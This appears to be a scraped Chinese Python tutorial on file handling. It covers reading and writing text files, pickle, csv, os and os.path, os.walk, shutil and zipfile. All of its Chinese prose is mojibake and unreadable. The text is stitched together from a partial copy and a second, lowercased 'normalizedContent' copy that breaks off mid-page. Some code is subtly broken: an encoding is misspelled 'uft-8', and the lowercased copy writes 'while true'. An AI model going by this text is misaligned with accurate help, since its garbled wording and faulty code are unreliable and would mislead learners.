æè¡è¯»å\nwith open("helloworld.txt","r") as f:\n    while True:\n        line = f.readline()\n        if not line:\n            break\n        else:\n            print(line,end="")\n\n# è¿­ä»£è¿å\nwith open("helloworld.txt","r") as f:\n    for l in f:\n        print(l,end="")\n\n# è¯»ååè¡¨\nwith open("helloworld.txt","r") as f:\n    lines = f.readlines()\n    lines = [line.rstrip()+"#"+str(index+1)+"\\n" for index,line in enumerate(lines) ]\n    print(lines)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# äºè¿å¶æä»¶çå¤ç\n\näºè¿å¶æä»¶çå¤çæµç¨åææ¬æä»¶ä¸è´ï¼åªæ¯å¨åå»ºæä»¶å¯¹è±¡çæ¶åè¦æå®æ¶äºè¿å¶æ¨¡å¼çã\n\n\n# æä»¶å¯¹è±¡çå±æ§åæ¹æ³\n\næä»¶å¯¹è±¡ä¸­å°è£äºæä»¶çç¸å³æä½ï¼å¹¶ä¸å°è£äºä¸äºå±æ§åæ¹æ³ï¼å¦ä¸è¡¨æç¤ºï¼\n\nå±æ§ï¼\n\nå±æ§       è¯´æ\nname     è¿åæä»¶çåå­\nmode     è¿åæä»¶çæå¼æ¨¡å¼\nclosed   è¥æä»¶è¢«å³é­åè¿å True\n\næä»¶çæå¼æ¨¡å¼ï¼\n\næ¨¡å¼   è¯´æ\nr    è¯»æ¨¡å¼\nw    åæ¨¡å¼\na    è¿½å æ¨¡å¼\nb    äºè¿å¶æ¨¡å¼ï¼å¯ä¸å¶ä»æ¨¡å¼ç»åï¼\n+    è¯»åæ¨¡å¼ï¼å¯ä»¥å¶ä»æ¨¡å¼ç»åï¼\n\næä»¶å¯¹è±¡çå¸¸ç¨æ¹æ³\n\næ¹æ³å                     è¯´æ\nread([size])            ä»æä»¶ä¸­è¯»å size ä¸ªå­èæå­ç¬¦çåå®¹è¿åãè¥çç¥[size]ï¼åè¯» åå°æä»¶æ«å°¾ï¼å³ä¸æ¬¡è¯»åæä»¶ææåå®¹\nreadline()              ä»ææ¬æä»¶ä¸­è¯»åä¸è¡åå®¹\nreadlines()             æææ¬æä»¶ä¸­æ¯ä¸è¡é½ä½ä¸ºç¬ç«çå­ç¬¦ä¸²å¯¹è±¡ï¼å¹¶å°è¿äºå¯¹è±¡æ¾å¥ åè¡¨è¿å\nwrite(str)              å°å­ç¬¦ä¸² str åå®¹åå¥æä»¶\nwritelines(s)           å°å­ç¬¦ä¸²åè¡¨ s åå¥æä»¶æä»¶ï¼ä¸æ·»å æ¢è¡ç¬¦\nseek(offset[,whence])   ææä»¶æéç§»å¨å°æ°çä½ç½®ï¼offset è¡¨ç¤ºç¸å¯¹äº whence çå¤å°ä¸ªå­èçåç§»éï¼ offsetï¼ off\n                        ä¸ºæ­£å¾ç»ææ¹åç§»å¨ï¼ä¸ºè´å¾å¼å§æ¹åç§»å¨ whence ä¸åçå¼ä»£è¡¨ä¸åå«ä¹ï¼ 0: ä»æä»¶å¤´å¼å§è®¡ç®ï¼é»è®¤å¼ï¼\n                        1ï¼ä»å½åä½ç½®å¼å§è®¡ç® 2ï¼ä»æä»¶å°¾å¼å§è®¡ç®\ntell()                  è¿åæä»¶æéçå½åä½ç½®\ntruncate([size])        ä¸è®ºæéå¨ä»ä¹ä½ç½®ï¼åªçä¸æéå size ä¸ªå­èçåå®¹ï¼å¶ä½å¨ é¨å é¤ï¼ å¦ææ²¡æä¼ å¥\n                        sizeï¼åå½æéå½åä½ç½®å°æä»¶æ«å°¾åå®¹å¨é¨å é¤\nflush()                 æç¼å²åºçåå®¹åå¥æä»¶ï¼ä½ä¸å³é­æä»¶\nclose()                 æç¼å²åºåå®¹åå¥æä»¶ï¼åæ¶å³é­æä»¶ï¼éæ¾æä»¶å¯¹è±¡ç¸å³èµæº\n\n\n# ä»»æä½ç½®æä½æä»¶\n\nseekç§»å¨æä»¶æéï¼\n\nwith open("helloworld.txt","r") as f:\n    print("{name}".format(name=f.name))\n    print(f.tell())\n    print("è¯»åæä»¶çåå®¹ï¼{0}".format(str(f.readline())))\n    print(f.tell())\n    print(f.seek(0,0))\n    print("è¯»åçæä»¶åå®¹ï¼{0}".format(f.readline()))\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# pickleåºåå\n\nå¨Pythonä¸­ä¸åé½æ¯å¯¹è±¡ï¼å¯¹è±¡ä»æ¬è´¨ä¸è¯´æ¯ä¸ä¸ªå­å¨æ°æ®çåå­åï¼ææ¶åæä»¬éè¦å°åå­ä¸­çæ°æ®ä¿å­å°ç¡¬çä¸æèéè¿ç½ç»åéç»å¶ä»çè®¡ç®æºï¼å¨è¿ä¸ªæ¶åï¼å°±éè¦å¯¹è±¡çåºåååååºååçæä½ãå¯¹è±¡çåºååæºå¶ååå¹¿æ³çåºç¨ä¸åå¸å¼åå¹¶è¡ç³»ç»ä¸ã\n\nåºååæçæ¯å°å¯¹è±¡è½¬åä¸ºä¸²è¡åçæ°æ®å½¢å¼ï¼å­å¨å°ç¡¬çæèéè¿ç½ç»ä¼ è¾å°å¶ä»çå°æ¹ï¼ååºååæ¶ååºååç¸åçè¿ç¨ï¼æ¯å°è¯»åå°çä¸²è¡åçæ°æ®è½¬åä¸ºå¯¹è±¡ã\n\næä»¬å¯ä»¥ä½¿ç¨pickleæ¨¡åä¸­çå½æ°å®ç°åºåååååºååçæä½ã\n\nå¸¸ç¨çä¸¤ä¸ªå½æ°ï¼\n\npickle.dump(obj,file) objæ¯è¦è¢«åºååçæä»¶ï¼fileæ¯å­å¨çæä»¶\npickle.load(file) ä»æä»¶ä¸­è¯»åæ°æ®ï¼ååºååçæå¯¹è±¡\n\n\n1\n2\n\n\nåºååæ°æ®ï¼\n\nimport pickle\nwith open("haha.ser","wb") as f:\n    a1 = "halo"\n    a2 = 1\n    a3 = [10,2,3]\n    pickle.dump(a1,f)\n    pickle.dump(a2,f)\n    pickle.dump(a3,f)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå°æä»¶ååºååä¸ºå¯¹è±¡ï¼\n\nimport pickle\nwith open("haha.ser","rb") as f:\n    a1 = pickle.load(f)\n    a2 = pickle.load(f)\n    a3 = pickle.load(f)\n    # a4 = pickle.load(f)\nprint(a1,a2,a3)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# CSVæä»¶æä½\n\ncsvæ¯ä¸ç§ä»¥éå·åéçææ¬æä»¶æ ¼å¼ï¼éå¸¸ç¨äºæ°æ®çäº¤æ¢ï¼Excelæä»¶åæ°æ®åºçå¯¼å¥å¯¼åºï¼åexcelä¸åï¼csvçå¼æ²¡æç±»åï¼é½æ¯å­ç¬¦ä¸²ï¼æ²¡ææ ¼å¼ï¼æ²¡æå·¥ä½è¡¨ï¼æ²¡æå¾åã\n\nPythonä¸­æ ååºæ¨¡åcsvæä¾äºä¸ä¸ªè¯»åcsvå¯¹è±¡çæ¹å¼ï¼\n\ncsv.readerè¯»åcsvæä»¶\n\nimport csv\nwith open("test.csv","r") as f:\n    f_csv = csv.reader(f)\n    headers = next(f_csv)\n    print(headers)\n    for row in f_csv:\n        print(row)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ncsv.writerå¯¹è±¡åå¥csvæä»¶\n\nimport csv\nheaders = ["å­¦å·","å§å","å¹´é¾"]\nrows = [\n    ("1001","zhangsan",12),\n    ("1002","æå",12)\n]\n\nwith open("testwrite.csv","w") as f:\n    f_csv = csv.writer(f)\n    f_csv.writerow(headers)\n    f_csv.writerows(rows)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# osåos.pathæ¨¡å\n\nosæ¨¡åå¯ä»¥å¸®å©æä»¬ç´æ¥å¯¹æä½ç³»ç»è¿è¡ç¸å³çæä½ãæä»¬å¯ä»¥ç´æ¥è°ç¨æä½ç³»ç»çå¯æ§è¡å½ä»¤ãæä»¶ç­ç­ã\n\n\n# osæ¨¡å\n\nos.systemå¯ä»¥å¸®å©æä»¬ç´æ¥è°ç¨ç³»ç»çå½ä»¤\n\nimport os\nos.system("whoami")\n\n\n1\n2\n\n\nè°ç¨pingå½ä»¤\n\nimport os\nos.system("whoami")\nos.system("ping -c 4 www.baidu.com")\n\n"""\nplankton\nPING www.a.shifen.com (180.97.34.94): 56 data bytes\n64 bytes from 180.97.34.94: icmp_seq=0 ttl=55 time=15.469 ms\n64 bytes from 180.97.34.94: icmp_seq=1 ttl=55 time=19.000 ms\n64 bytes from 180.97.34.94: icmp_seq=2 ttl=55 time=19.176 ms\n64 bytes from 180.97.34.94: icmp_seq=3 ttl=55 time=19.265 ms\n\n--- www.a.shifen.com ping statistics ---\n4 packets transmitted, 4 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 15.469/18.227/19.265/1.595 ms\n\n"""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nos.startfileè°ç¨å®è£å¥½çç¨åºï¼\n\nimport os\nos.startfile("æä»¶è·¯å¾")\n\n\n1\n2\n\n\n\n# osæ¨¡åæä½æä»¶\n\næä»¬åé¢éè¿openæä½æå¼æä»¶åå¥åè¯»åæä»¶çåå®¹ï¼å¦æéè¦å¯¹æä»¶åç®å½åå¶ä»çæä½ï¼åéè¦ä½¿ç¨osåos.pathæ¨¡åã\n\nosæ¨¡åä¸­å¸¸ç¨çæä½æä»¶çæ¹æ³ï¼\n\næ¹æ³å                æè¿°\nremove(path)       å é¤æå®çæä»¶\nrename(src,dest)   éå½åæä»¶æç®å½\nstat(path)         è¿åæä»¶çææå±æ§\nlistdir(path)      è¿å path ç®å½ä¸çæä»¶åç®å½åè¡¨\n\nosæ¨¡åä¸é¢å¸¸ç¨çæä½ç®å½çæ¹æ³ï¼\n\næ¹æ³å                                æè¿°\nmkdir(path)                        åå»ºç®å½\nmakedirs(path1/path2/path3/... )   åå»ºå¤çº§ç®å½\nrmdir(path)                        å é¤ç®å½\nremovedirs(path1/path2...)         å é¤å¤çº§ç®å½\ngetcwd()                           è¿åå½åå·¥ä½ç®å½ï¼current work dir\nchdir(path)                        æ path è®¾ä¸ºå½åå·¥ä½ç®å½\nwalk()                             éåç®å½æ \nsep                                å½åæä½ç³»ç»æä½¿ç¨çè·¯å¾åéç¬¦\n\nå©ç¨osåå»ºå é¤è·åæä»¶çä¿¡æ¯ï¼\n\nimport os\nprint(os.name) # posix\nprint(os.sep) # /\nprint(repr(os.linesep)) # \'\\n\'\n\nprint(os.stat("demo.py")) #os.stat_result(st_mode=33188, st_ino=3401315, st_dev=16777222, st_nlink=1, st_uid=501, st_gid=20, st_size=24107, st_atime=1648276062, st_mtime=1648276062, st_ctime=1648276062)\n\n#############æä½å·¥ä½ç®å½\nprint(os.getcwd())\nos.chdir("./")\n# os.mkdir("hello")\n############åå»ºç®å½ åå»ºå¤çº§ç®å½ å é¤ç®å½\n# os.rmdir("hello")\n# os.makedirs("hello/world")\n# os.removedirs("hello/world")\n# os.rename("test.csv","hello.csv")\n\ndirs = os.listdir("./")\nprint(dirs) # [\'helloworld.txt\', \'ccc.txt\', \'error.log\', \'hello.csv\', \'haha.ser\', \'demo.py\', \'testwrite.csv\', \'.idea\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# os.pathæ¨¡å\n\nos.pathæ¨¡åæä¾äºç®å½ç¸å³çæä½\n\næ¹æ³                   æè¿°\nisabs(path)          å¤æ­ path æ¯å¦ç»å¯¹è·¯å¾\nisdir(path)          å¤æ­ path æ¯å¦ä¸ºç®å½\nisfile(path)         å¤æ­ path æ¯å¦ä¸ºæä»¶\nexists(path)         å¤æ­æå®è·¯å¾çæä»¶æ¯å¦å­å¨\ngetsize(filename)    è¿åæä»¶çå¤§å°\nabspath(path)        è¿åç»å¯¹è·¯å¾\ndirname(p)           è¿åç®å½çè·¯å¾\ngetatime(filename)   è¿åæä»¶çæåè®¿é®æ¶é´\ngetmtime(filename)   è¿åæä»¶çæåä¿®æ¹æ¶é´\nwalk(top,func,arg)   éå½æ¹å¼éåç®å½\njoin(path,*paths)    è¿æ¥å¤ä¸ª path\nsplit(path)          å¯¹è·¯å¾è¿è¡åå²ï¼ä»¥åè¡¨å½¢å¼è¿å\nsplitext(path)       ä»è·¯å¾ä¸­åå²æä»¶çæ©å±å\n\n\n# walkéå½éåææçæä»¶åç®å½\n\nos.walkæ¹æ³ä¼è¿åä¸ä¸ª3ä¸ªåç´ çåç»ï¼\n\ndirpathï¼è¦ååºæå®ç®å½çè·¯å¾\n\ndirnamesï¼ç®å½ä¸çæææä»¶å¤¹\n\nfilenamesï¼ç®å½ä¸çæææä»¶\n\nä½¿ç¨walkéå½éåæææä»¶åç®å½\n\nimport os\n\nall_files = []\n\npath = os.getcwd()\nlistfiles = os.walk(path)\n\nfor dirpath,dirnames,filenames in listfiles:\n    for dir in dirnames:\n        all_files.append(os.path.join(dirpath,dir))\n    for name in filenames:\n        all_files.append(os.path.join(dirpath,name))\n\nfor file in all_files:\n    print(file)\n    \n"""\n/Users/plankton/Workspace/Py/StudyPy/.idea\n/Users/plankton/Workspace/Py/StudyPy/helloworld.txt\n/Users/plankton/Workspace/Py/StudyPy/ccc.txt\n/Users/plankton/Workspace/Py/StudyPy/error.log\n/Users/plankton/Workspace/Py/StudyPy/hello.csv\n/Users/plankton/Workspace/Py/StudyPy/haha.ser\n/Users/plankton/Workspace/Py/StudyPy/demo.py\n/Users/plankton/Workspace/Py/StudyPy/testwrite.csv\n/Users/plankton/Workspace/Py/StudyPy/.idea/inspectionProfiles\n/Users/plankton/Workspace/Py/StudyPy/.idea/StudyPy.iml\n/Users/plankton/Workspace/Py/StudyPy/.idea/.gitignore\n/Users/plankton/Workspace/Py/StudyPy/.idea/workspace.xml\n/Users/plankton/Workspace/Py/StudyPy/.idea/modules.xml\n/Users/plankton/Workspace/Py/StudyPy/.idea/misc.xml\n/Users/plankton/Workspace/Py/StudyPy/.idea/inspectionProfiles/profiles_settings.xml\n"""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# shutilæ¨¡å æ·è´ååç¼©\n\nshutilæ¯pythonæ ååºæä¾çç¨äºæä»¶åæä»¶å¤¹æ·è´ç§»å¨å é¤ç­ï¼è¿å¯ä»¥ç¨äºæä»¶çåç¼©åè§£åç¼©æä½ã\n\nosæ¨¡åæä¾äºå¯¹äºç®å½åæä»¶çä¸è¬æä½ï¼shutilæ¨¡åä½ä¸ºè¡¥åï¼æä¾äºç§»å¨åç¼©å¤å¶è§£åç¼©ç­æä½ã\n\næä»¶æ·è´æä½ï¼\n\nimport shutil\nshutil.copy("helloworld.txt","helloworld1.txt")\n\n# éå½æ·è´\nshutil.copytree("../","hello",ignore=shutil.ignore_patterns("*.html","*.ser"))\n\n\n\n1\n2\n3\n4\n5\n6\n\n\nåç¼©åè§£åç¼©æä½ï¼\n\n# æä»¶åç¼©\nimport shutil\nimport zipfile\n\n# å°å½åæä»¶å¤¹çåå®¹åç¼©çæcode.zipæ¾å°ä¸ä¸çº§æä»¶å¤¹ä¸­\n# shutil.make_archive("../code","zip","./")\n\nz = zipfile.ZipFile("a.zip","w")\nz.write("hello.csv")\nz.write("haha.ser")\nz.close()\n\n# è§£åç¼©\nz2 = zipfile.ZipFile("a.zip","r")\nz2.extractall("../hello")\nz2.close()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',normalizedContent:'# pythonæä»¶æä½çé£äºäº\n\n> æä»¶æ¯æ°æ®æä¹åçä¸ç§éè¦çä»è´¨ï¼éè¿æä»¶çè¯»åï¼å¯ä»¥å°ç¨åºè¿è¡çæ°æ®ä¿å­å°ç¡¬çä¸ï¼å¹¶å¯ä»¥å¨ä¸ä¸æ¬¡è¿è¡ç¨åºçæ¶ï¼æ¢å¤ä¹åçæ°æ®ãå¾å¤è½¯ä»¶ç³»ç»æ¯å°æ°æ®å­å¨å°æ°æ®åºä¸­ï¼èæ°æ®åºå®éä¸ä¹æ¯åºäºæä»¶å½¢å¼å­å¨çã\n\n\n# ææ¬æä»¶åäºè¿å¶æä»¶\n\næç§æä»¶çæ°æ®ç»ç»å½¢å¼ï¼æ¶ææä»¶åä¸ºææ¬æä»¶åäºè¿å¶æä»¶ä¸¤ç§ã\n\n 1. ææ¬æä»¶\n    \n    å­å¨æ®éçå­ç¬¦ææ¬ï¼pythonä¸­é»è®¤ä½¿ç¨unicodeï¼ä¸ä¸ªå­ç¬¦å ç¨ä¸¤ä¸ªå­èï¼å¯è¡¨ç¤º65536ä¸ªå­ç¬¦ã\n\n 2. äºè¿å¶æä»¶\n    \n    äºè¿å¶æä»¶ææ°æ®åå®¹å®ç¨å­èå­å¨ãæ æ³ç´æ¥ä½¿ç¨ææ¬å·¥å·æå¼ã\n\n\n# æä»¶æä½æ¨¡åç®ä»\n\npythonæ ååºä¸­å­å¨å¤§éçæä»¶æä½ç¸å³çæ¨¡åï¼å¦ä¸è¡¨æç¤ºï¼\n\nåç§°                              è¯´æ\nio æ¨¡å                           æä»¶æµçè¾å¥åè¾åºæä½ inputoutput\nos æ¨¡å                           åºæ¬æä½ç³»ç»åè½ï¼åæ¬æä»¶æä½\nglob æ¨¡å                         æ¥æ¾ç¬¦åç¹å®è§åçæä»¶è·¯å¾å\nfnmatch æ¨¡å                      ä½¿ç¨æ¨¡å¼æ¥å¹éæä»¶è·¯å¾å\nfileinput æ¨¡å                    å¤çå¤ä¸ªè¾å¥æä»¶\nfilecmp æ¨¡å                      ç¨äºæä»¶çæ¯è¾\ncvs æ¨¡å                          ç¨äº csv æä»¶å¤ç\npickle å cpickle                ç¨äºåºåååååºåå\nxml å                           ç¨äº xml æ°æ®å¤ç\nbz2ãgzipãzipfileãzlibãtarfile   ç¨äºå¤çåç¼©åè§£åç¼©æä»¶ï¼åå«å¯¹åºä¸åçç®æ³ï¼\n\n\n# åå»ºæä»¶å¯¹è±¡\n\næä»¬ä½¿ç¨openåå»ºä¸ä¸ªæä»¶å¯¹è±¡ï¼åå»ºçæ¹å¼å¦ä¸é¢çä¾å­æç¤ºï¼æä»¶è·¯å¾å¯ä»¥æ¯å¨è·¯å¾æèç¸å¯¹è·¯å¾ãå ä¸ºè·¯å¾åéç¬¦æ¶åå°è½¬ä¹çé®é¢ï¼å¯ä»¥ä½¿ç¨åå§å­ç¬¦ä¸²ï¼å­ç¬¦ä¸²åé¢å ä¸ä¸ªrï¼è¡¨ç¤ºè·¯å¾ï¼\n\nwith open(r"./error.log","w") as f:\n\n\n1\n\n\næä»¶çæå¼æ¹å¼æä¸é¢çå ç§ï¼\n\næ¨¡å¼   æè¿°\nr    è¯» read æ¨¡å¼\nw    å write æ¨¡å¼ãå¦ææä»¶ä¸å­å¨ååå»ºï¼å¦ææä»¶å­å¨ï¼åéåæ°åå®¹ï¼\na    è¿½å  append æ¨¡å¼ãå¦ææä»¶ä¸å­å¨ååå»ºï¼å¦ææä»¶å­å¨ï¼åå¨æä»¶æ«å°¾è¿½å åå®¹\nb    äºè¿å¶ binary æ¨¡å¼ï¼å¯ä¸å¶ä»æ¨¡å¼ç»åä½¿ç¨ï¼\n+    è¯»ãåæ¨¡å¼ï¼å¯ä¸å¶ä»æ¨¡å¼ç»åä½¿ç¨ï¼\n\nè¥ææä»¬æ²¡æå¢å bï¼åé»è®¤å¤ççäºææ¬æä»¶çå¯¹è±¡ã\n\n\n# ææ¬æä»¶å¤ç\n\n\n# ææ¬æä»¶çåå¥\n\nææ¬æä»¶çåå¥åå«ä¸ä¸ªæ­¥éª¤ï¼\n\n 1. åå»ºææ¬æä»¶å¯¹è±¡\n 2. åå¥æ°æ®\n 3. å³é­æä»¶å¯¹è±¡\n\nä¾å­ï¼\n\nf = open(r"aaa.txt","a")\ns = "abcd\\nabcd\\t\\thello"\nf.write(s)\nf.close()\n\n\n1\n2\n3\n4\n\n\n# ç¼ç æ ¼å¼\n\nå¨æææ¬çæ¶åï¼å¦æä¸æ³¨æç¼ç æ ¼å¼çé®é¢ï¼ç»å¸¸ä¼ç¢°å°ä¹±ç çé®é¢ï¼ä¸é¢ç®åçä¸ä¸å ç§ç¼ç æ ¼å¼çå³ç³»ã\n\n\n\n# ä¸­æä¹±ç é®é¢\n\nwindowsé»è®¤çç¼ç æ ¼å¼äºgbkï¼linuxé»è®¤çç¼ç æ ¼å¼æ¯utf-8ï¼æä»¬ä½¿ç¨openæå¼æä»¶æ¶ï¼é»è®¤ä½¿ç¨çæ¯ç³»ç»ç¼ç ãæä»¬å¯ä»¥éè¿æå®æä»¶ç¼ç çæ ¼å¼è§£å³ä¸­æçä¹±ç é®é¢ã\n\nf = open(r"aaa.txt","a",encoding="uft-8")\n\n\n1\n\n\n# ä½¿ç¨writeæèwritelineåå¥æ°æ®\n\nwriteæ¯å°åæ°å­ç¬¦ä¸²åå¥å°æä»¶ä¸­ï¼writelinesæ¯å°å­ç¬¦ä¸²åè¡¨åå¥ä¸ºé¾ä¸­ï¼å¹¶åä¸æ·»å æ¢è¡ç¬¦ã\n\nf = open(r"./bbb.txt","w",encoding="utf-8")\ns = ["aa\\n","bb\\n"]\n# f.write(s)\nf.writelines(s)\n\n\n1\n2\n3\n4\n\n\n# closeå³é­æä»¶æµ\n\nç±äºæä»¶åºå±æ¯ææä½ç³»ç»æ§å¶çï¼å æ­¤æä»¬æå¼çæä»¶å¯¹è±¡éè¦æ¾ç¤ºè°ç¨closeæ¹æ³å³é­æä»¶å¯¹è±¡ãå½è°ç¨äºcloseæ¹æ³æ¶ï¼é¦åä¼æç¼å²åºçæ°æ®åå¥å°æä»¶ä¸­ï¼ç¶åå³é­æä»¶ï¼éæ¾å¯¹è±¡ãéå¸¸æåµä¸æä»¬å°closeåå°finallyéé¢æèéåwithä½¿ç¨ã\n\nwith open(r"ccc.txt","w") as f:\n    f.write("helloworld")\n\ntry:\n    f = open(r"helloworld.txt","w")\n    f.write("ehahah")\nfinally:\n    f.close()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# ææ¬æä»¶çè¯»å\n\nææ¬æä»¶çè¯»åä¸è¬ä½¿ç¨å¦ä¸çå ç§æ¹å¼ï¼\n\n 1. read([size])\n    \n    è¯»åæå®é¿åº¦çå­ç¬¦ï¼å¹¶ä¸è¿åç»æï¼å¦ææ²¡ææå®å­ç¬¦é¿åº¦ï¼å°±ä¼è¯»åæ´ä¸ªæä»¶ï¼\n\n 2. readline()\n    \n    ä»¥è¡ä¸ºåä½è¯»åç»æå¹¶è¿åï¼è¯»åå°æåä¼è¿åç©ºä¸²\n\n 3. readlines()\n    \n    ææ¬æä»¶ä¸­çæ¯ä¸è¡ä½ä¸ºä¸ä¸ªå­ç¬¦ä¸²å­å¥åè¡¨ï¼æåè¿åä¸ä¸ªåè¡¨\n\n# è¯»ååä¸ªå­ç¬¦\nwith open(r"helloworld.txt","r") as f:\n    print(f.read(4))\n\n# è¯»åå¨é¨åå®¹\nwith open(r"helloworld.txt","r") as f:\n    print(f.read())\n\n# æè¡è¯»å\nwith open("helloworld.txt","r") as f:\n    while true:\n        line = f.readline()\n        if not line:\n            break\n        else:\n            print(line,end="")\n\n# è¿­ä»£è¿å\nwith open("helloworld.txt","r") as f:\n    for l in f:\n        print(l,end="")\n\n# è¯»ååè¡¨\nwith open("helloworld.txt","r") as f:\n    lines = f.readlines()\n    lines = [line.rstrip()+"#"+str(index+1)+"\\n" for index,line in enumerate(lines) ]\n    print(lines)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# äºè¿å¶æä»¶çå¤ç\n\näºè¿å¶æä»¶çå¤çæµç¨åææ¬æä»¶ä¸è´ï¼åªæ¯å¨åå»ºæä»¶å¯¹è±¡çæ¶åè¦æå®æ¶äºè¿å¶æ¨¡å¼çã\n\n\n# æä»¶å¯¹è±¡çå±æ§åæ¹æ³\n\næä»¶å¯¹è±¡ä¸­å°è£äºæä»¶çç¸å³æä½ï¼å¹¶ä¸å°è£äºä¸äºå±æ§åæ¹æ³ï¼å¦ä¸è¡¨æç¤ºï¼\n\nå±æ§ï¼\n\nå±æ§       è¯´æ\nname     è¿åæä»¶çåå­\nmode     è¿åæä»¶çæå¼æ¨¡å¼\nclosed   è¥æä»¶è¢«å³é­åè¿å true\n\næä»¶çæå¼æ¨¡å¼ï¼\n\næ¨¡å¼   è¯´æ\nr    è¯»æ¨¡å¼\nw    åæ¨¡å¼\na    è¿½å æ¨¡å¼\nb    äºè¿å¶æ¨¡å¼ï¼å¯ä¸å¶ä»æ¨¡å¼ç»åï¼\n+    è¯»åæ¨¡å¼ï¼å¯ä»¥å¶ä»æ¨¡å¼ç»åï¼\n\næä»¶å¯¹è±¡çå¸¸ç¨æ¹æ³\n\næ¹æ³å                     è¯´æ\nread([size])            ä»æä»¶ä¸­è¯»å size ä¸ªå­èæå­ç¬¦çåå®¹è¿åãè¥çç¥[size]ï¼åè¯» åå°æä»¶æ«å°¾ï¼å³ä¸æ¬¡è¯»åæä»¶ææåå®¹\nreadline()              ä»ææ¬æä»¶ä¸­è¯»åä¸è¡åå®¹\nreadlines()             æææ¬æä»¶ä¸­æ¯ä¸è¡é½ä½ä¸ºç¬ç«çå­ç¬¦ä¸²å¯¹è±¡ï¼å¹¶å°è¿äºå¯¹è±¡æ¾å¥ åè¡¨è¿å\nwrite(str)              å°å­ç¬¦ä¸² str åå®¹åå¥æä»¶\nwritelines(s)           å°å­ç¬¦ä¸²åè¡¨ s åå¥æä»¶æä»¶ï¼ä¸æ·»å æ¢è¡ç¬¦\nseek(offset[,whence])   ææä»¶æéç§»å¨å°æ°çä½ç½®ï¼offset è¡¨ç¤ºç¸å¯¹äº whence çå¤å°ä¸ªå­èçåç§»éï¼ offsetï¼ off\n                        ä¸ºæ­£å¾ç»ææ¹åç§»å¨ï¼ä¸ºè´å¾å¼å§æ¹åç§»å¨ whence ä¸åçå¼ä»£è¡¨ä¸åå«ä¹ï¼ 0: ä»æä»¶å¤´å¼å§è®¡ç®ï¼é»è®¤å¼ï¼\n                        1ï¼ä»å½åä½ç½®å¼å§è®¡ç® 2ï¼ä»æä»¶å°¾å¼å§è®¡ç®\ntell()                  è¿åæä»¶æéçå½åä½ç½®\ntruncate([size])        ä¸è®ºæéå¨ä»ä¹ä½ç½®ï¼åªçä¸æéå size ä¸ªå­èçåå®¹ï¼å¶ä½å¨ é¨å é¤ï¼ å¦ææ²¡æä¼ å¥\n                        sizeï¼åå½æéå½åä½ç½®å°æä»¶æ«å°¾åå®¹å¨é¨å é¤\nflush()                 æç¼å²åºçåå®¹åå¥æä»¶ï¼ä½ä¸å³é­æä»¶\nclose()                 æç¼å²åºåå®¹åå¥æä»¶ï¼åæ¶å³é­æä»¶ï¼éæ¾æä»¶å¯¹è±¡ç¸å³èµæº\n\n\n# ä»»æä½ç½®æä½æä»¶\n\nseekç§»å¨æä»¶æéï¼\n\nwith open("helloworld.txt","r") as f:\n    print("{name}".format(name=f.name))\n    print(f.tell())\n    print("è¯»åæä»¶çåå®¹ï¼{0}".format(str(f.readline())))\n    print(f.tell())\n    print(f.seek(0,0))\n    print("è¯»åçæä»¶åå®¹ï¼{0}".format(f.readline()))\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# pickleåºåå\n\nå¨pythonä¸­ä¸åé½æ¯å¯¹è±¡ï¼å¯¹è±¡ä»æ¬è´¨ä¸è¯´æ¯ä¸ä¸ªå­å¨æ°æ®çåå­åï¼ææ¶åæä»¬éè¦å°åå­ä¸­çæ°æ®ä¿å­å°ç¡¬çä¸æèéè¿ç½ç»åéç»å¶ä»çè®¡ç®æºï¼å¨è¿ä¸ªæ¶åï¼å°±éè¦å¯¹è±¡çåºåååååºååçæä½ãå¯¹è±¡çåºååæºå¶ååå¹¿æ³çåºç¨ä¸åå¸å¼åå¹¶è¡ç³»ç»ä¸ã\n\nåºååæçæ¯å°å¯¹è±¡è½¬åä¸ºä¸²è¡åçæ°æ®å½¢å¼ï¼å­å¨å°ç¡¬çæèéè¿ç½ç»ä¼ è¾å°å¶ä»çå°æ¹ï¼ååºååæ¶ååºååç¸åçè¿ç¨ï¼æ¯å°è¯»åå°çä¸²è¡åçæ°æ®è½¬åä¸ºå¯¹è±¡ã\n\næä»¬å¯ä»¥ä½¿ç¨pickleæ¨¡åä¸­çå½æ°å®ç°åºåååååºååçæä½ã\n\nå¸¸ç¨çä¸¤ä¸ªå½æ°ï¼\n\npickle.dump(obj,file) objæ¯è¦è¢«åºååçæä»¶ï¼fileæ¯å­å¨çæä»¶\npickle.load(file) ä»æä»¶ä¸­è¯»åæ°æ®ï¼ååºååçæå¯¹è±¡\n\n\n1\n2\n\n\nåºååæ°æ®ï¼\n\nimport pickle\nwith open("haha.ser","wb") as f:\n    a1 = "halo"\n    a2 = 1\n    a3 = [10,2,3]\n    pickle.dump(a1,f)\n    pickle.dump(a2,f)\n    pickle.dump(a3,f)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå°æä»¶ååºååä¸ºå¯¹è±¡ï¼\n\nimport pickle\nwith open("haha.ser","rb") as f:\n    a1 = pickle.load(f)\n    a2 = pickle.load(f)\n    a3 = pickle.load(f)\n    # a4 = pickle.load(f)\nprint(a1,a2,a3)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 